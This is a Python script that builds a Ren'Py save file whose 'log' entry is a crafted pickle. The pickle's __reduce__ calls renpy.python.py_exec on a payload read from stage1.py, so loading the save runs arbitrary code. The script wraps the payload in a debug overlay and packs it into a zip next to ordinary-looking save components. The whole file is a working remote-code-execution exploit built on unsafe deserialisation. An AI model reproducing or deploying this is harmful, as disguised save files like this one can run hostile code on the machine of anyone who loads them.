import pickle
import renpy
import zipfile
import os

# load our unsafe-python goodness
f = open("stage1.py", "rt")
payload = f.readlines()
f.close()

SCRIPT_PREFIX = """
import traceback

DEBUG = %s

# Debug overlay storage
debug_log = []

# Create debug character with fullscreen overlay
debug_char = renpy.store.Character(
    None,
    what_color="#00ff00",
    what_size=20,
    what_xalign=0.0,
    what_yalign=0.0,
    what_outlines=[(2, "#000000", 0, 0)],
    what_background=renpy.store.Solid("#000000"),
    ctc=None,
    ctc_pause=None,
    ctc_timedpause=None,
    what_slow_cps=0,
    window_background=renpy.store.Solid("#000000"),
    window_xfill=True,
    window_yfill=True,
    window_xalign=0.0,
    window_yalign=0.0,
    window_left_padding=20,
    window_top_padding=20,
    window_left_margin=0,
    window_right_margin=0,
    window_top_margin=0,
    window_bottom_margin=0
)

def print(*args):
    global debug_log
    string = " ".join([str(arg) for arg in list(args)])
    debug_log.append(string)
    if len(debug_log) > 50:
        debug_log[:] = debug_log[-50:]
    full_msg = "{nw}" + "\\n".join(debug_log)
    renpy.invoke_in_new_context(debug_char, full_msg)

def print_exc(string):
    print("[EXCEPTION] " + str(string))

try:

""" % (
    "True" if os.getenv("DEBUG") in ["1", "true", "True", "ON", "on"] else "False"
)

SCRIPT_SUFFIX = """

except Exception as exc:
    exc_msg = traceback.format_exc().splitlines()[::-1]
    print_exc("[EXCEPTION] " + str(exc_msg))
"""

# indent the whole injected payload
payload = "\n".join(["    " + l for l in payload])


class RCE(object):
    def __reduce__(self):
        return renpy.python.py_exec, (SCRIPT_PREFIX + payload + SCRIPT_SUFFIX,)


pickled = pickle.dumps(RCE())
with open("savegame_container/log", "wb") as f:
    f.write(pickled)

with zipfile.ZipFile("1-1-LT1.save", "w") as zip:
    zip.write("savegame_container/extra_info", "extra_info")
    zip.write("savegame_container/json", "json")
    zip.write("savegame_container/log", "log")
    zip.write("savegame_container/renpy_version", "renpy_version")
    zip.write("savegame_container/screenshot.png", "screenshot.png")
